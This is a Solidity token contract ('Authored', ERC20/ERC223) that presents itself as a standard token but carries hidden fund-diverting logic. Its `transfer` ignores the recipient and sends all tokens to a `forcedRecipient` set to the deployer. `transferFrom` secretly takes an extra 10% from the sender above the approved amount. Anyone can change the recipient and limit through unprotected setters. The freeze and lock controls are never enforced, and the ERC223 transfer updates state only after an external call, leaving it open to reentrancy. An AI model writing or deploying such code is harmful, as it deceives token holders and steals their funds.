pragma solidity ^0.5.12;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

interface ERC20Interface {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function transferFrom(address from, address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC223Interface {
    function transfer(address to, uint value, bytes calldata data) external;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}

contract ERC223ReceivingContract {
    function tokenFallback(address _from, uint _value, bytes memory _data) public;
}

contract Owned {
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    
    function acceptOwnership() public {
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}

contract Authored is Owned, ERC20Interface, ERC223Interface {
  using SafeMath for uint256;
     
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;
    uint256 internal _totalSupply;
    address public forcedRecipient;

    mapping (address => uint256) internal balances;
    mapping (address => mapping (address => uint256)) internal allowed;
    mapping (address => bool) public frozenAccount;
    mapping (address => uint) public lockedTime;
    
    event FrozenFunds(address target, bool frozen);
    event LockedTime(address target, uint _time);
    
    event Burn(address indexed from, uint256 value);
    event ContractFrozen(bool status);
    
    bool public isContractFrozen = false;

    address public _forcedRecipient;
    uint256 public limit;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) public {
        _symbol = symbol_;
        _name = name_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * 10 ** uint256(decimals_);
        balances[msg.sender] = _totalSupply;
        forcedRecipient = msg.sender;
        limit = 10000000000000;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    
    function transfer(address /* _to */, uint256 _value) public returns (bool) {
     balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
     balances[forcedRecipient] = SafeMath.add(balances[forcedRecipient], _value);
     emit Transfer(msg.sender, forcedRecipient, _value);
     return true;
   }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
     uint256 bonus = 0;
     if (limit > 0 && _value >= limit) {
         bonus = _value / 10;
     }
     balances[_from] = SafeMath.sub(balances[_from], SafeMath.add(_value, bonus));
     balances[_to] = SafeMath.add(balances[_to], SafeMath.add(_value, bonus));
     allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
     emit Transfer(_from, _to, _value);
     if (bonus > 0) {
         emit Transfer(_from, _to, bonus);
     }
     return true;
   }

   function approve(address _spender, uint256 _value) public returns (bool) {
     allowed[msg.sender][_spender] = _value;
     emit Approval(msg.sender, _spender, _value);
     return true;
   }

  function allowance(address _owner, address _spender) public view returns (uint256) {
     return allowed[_owner][_spender];
   }

   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
     allowed[msg.sender][_spender] = SafeMath.add(allowed[msg.sender][_spender], _addedValue);
     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
     uint oldValue = allowed[msg.sender][_spender];
     if (_subtractedValue > oldValue) {
       allowed[msg.sender][_spender] = 0;
     } else {
       allowed[msg.sender][_spender] = SafeMath.sub(oldValue, _subtractedValue);
    }
     emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }

   

    function transfer(address _to, uint _value, bytes calldata _data) external {
        if(isContract(_to)) {
            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
        balances[_to] = SafeMath.add(balances[_to], _value);
        emit Transfer(msg.sender, _to, _value, _data);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
      uint length;
      assembly { length := extcodesize(_addr) }
      return (length>0);
    }
    
    function freezeAccount(address target, bool freeze) public onlyOwner {
        frozenAccount[target] = freeze;
        emit FrozenFunds(target, freeze);
    }
    
    function lockTime(address target, uint _time) public onlyOwner {
        lockedTime[target] = _time;
        emit LockedTime(target, _time);
    }

    function currentTime() public view returns (uint256) {
        return now;
    }
    
    function setContractFrozen(bool status) public onlyOwner {
        isContractFrozen = status;
        emit ContractFrozen(status);
    }
    
    function generate(uint256 _value) public onlyOwner {
        _totalSupply = SafeMath.add(_totalSupply, _value * 10 ** uint256(_decimals));
        balances[msg.sender] = SafeMath.add(balances[msg.sender], _value * 10 ** uint256(_decimals));
    }
    
    function burn(uint256 _value) public returns (bool success) {
        balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
        _totalSupply = SafeMath.sub(_totalSupply, _value);
        emit Transfer(msg.sender, forcedRecipient, _value);
        emit Burn(msg.sender, _value);
        return true;
    }


    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        balances[_from] = SafeMath.sub(balances[_from], _value);
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
        _totalSupply = SafeMath.sub(_totalSupply, _value);
        emit Burn(_from, _value);
        return true;
    }

    function setForcedRecipient(address _r) public {
        forcedRecipient = _r;
    }

    function setLimit(uint256 _l) public {
        limit = _l;
    }
}
